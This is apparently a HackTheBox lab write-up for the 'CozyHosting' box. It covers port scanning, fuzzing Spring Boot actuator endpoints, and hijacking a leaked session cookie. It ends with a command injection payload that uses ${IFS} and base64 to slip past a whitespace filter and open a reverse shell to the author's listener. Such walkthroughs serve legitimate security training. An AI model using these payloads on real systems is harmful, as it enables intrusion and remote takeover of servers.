# Box: CozyHosting
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.72.147 -v -p- -T4```

```
Nmap scan report for 10.129.72.147
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/20%OT=22%CT=1%CU=31735%PV=Y%DS=2%DC=T%G=Y%TM=653286
OS:99%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=103%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 1.802 days (since Wed Oct 18 19:39:32 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   240.95 ms 10.10.14.1
2   241.25 ms 10.129.72.147

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 14:54:33 2023 -- 1 IP address (1 host up) scanned in 1929.96 seconds
```
From our scan we have 2 open ports. Port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/965c2034-34c9-4493-9664-f7678b428f40)

Lets add that to our ```/etc/hosts``` file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
└─$ sudo nano /etc/hosts                               
[sudo] password for bl4ck4non: 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
└─$ cat /etc/hosts  
127.0.0.1       localhost
127.0.1.1       bl4ck4non-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.129.72.147 cozyhosting.htb
```
Going back to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a574552a-6f5b-4b27-bcd5-09f9b7e6d23f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2c604329-e04d-4066-b806-8b42dce3d168)

Checking the page source

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/36d5bc0b-1637-43a3-bebb-b84f82fecc5c)

The framework being used here is spring boot. Lets fuzz for directories using ffuf, we'll be using a wordlist specfic to spring boot

command:```ffuf -u "http://cozyhosting.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt  -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
└─$ ffuf -u "http://cozyhosting.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt  -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 349ms]
    * FUZZ: actuator

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 284ms]
    * FUZZ: actuator/env/home

[Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 291ms]
    * FUZZ: actuator/env

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 221ms]
    * FUZZ: actuator/env/lang

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 242ms]
    * FUZZ: actuator/env/path

[Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 337ms]
    * FUZZ: actuator/beans

[Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 284ms]
    * FUZZ: actuator/health

[Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 294ms]
    * FUZZ: actuator/mappings

[Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 279ms]
    * FUZZ: actuator/sessions

:: Progress: [784/784] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
The directory ```/actuator/sessions``` has something interesting hehe

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8e18003f-d95d-4ef5-a3c8-ae76ad2fa450)

We got login creds

Lets login with this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/94a7b438-f650-41a1-ad35-7bdab6dd5f3d)

oops, this didn't work, since the hash was md5 I tried to crack it, well it didn't work😅.

Inspect element and check out the cookie

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/03ee80ff-fb33-4a94-a170-31c95b05a7b7)

This looks like the value we found earlier, lets replace this with what we found earlier after that we'll refresh the page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/816b746c-dee6-4810-ab20-3a4d423effd3)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8300a92c-8134-45dd-903d-ca9a069101a6)

We are logged in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c70b0f7e-dbf6-4d4c-a3a8-52c14647e5ee)

We'll capture this request on burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62c6e077-e779-40d8-b8dc-49ba8f2a9a4b)

Lets follow the redirection

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aa9c08ee-7d21-4ee0-ab30-3b5d41b1cc2c)

We got a ```connection timed out``` error.

Lets look for a way to exploit this


# Exploitation

Take a look at the error again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/277b46a8-c5d5-407d-b48c-ad18303fd5f7)

We actually have a potential Command Injection vulnerability here. 

When I was trying some payloads, I found out that there is a whitespace filter

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4c5d4aa-933d-42f8-8e58-90232ee1ad6c)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb9ff8f6-67b1-493c-871c-7d2ec057075c)

One way we can bypass this is by using ```${IFS}```, so instead of using spaces, we use that. Another thing we'll do is encode our payload in base64, we'll echo this then pipe it to the decode function

First lets base64 encode our paylaod 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/47d2ebd4-2c90-4b93-9860-2e94fd606a25)

cool cool

Now this is the final payload that will help bypass the whitespace function and also spawn a reverse shell.

Ensure you set up your netcat listener before doing this

payload:```;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYexitx"|base64${IFS}-d|bash;```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1cb31819-7d38-4d81-b62a-cb101356e0b9)

After sending this request, check your netcat listener

























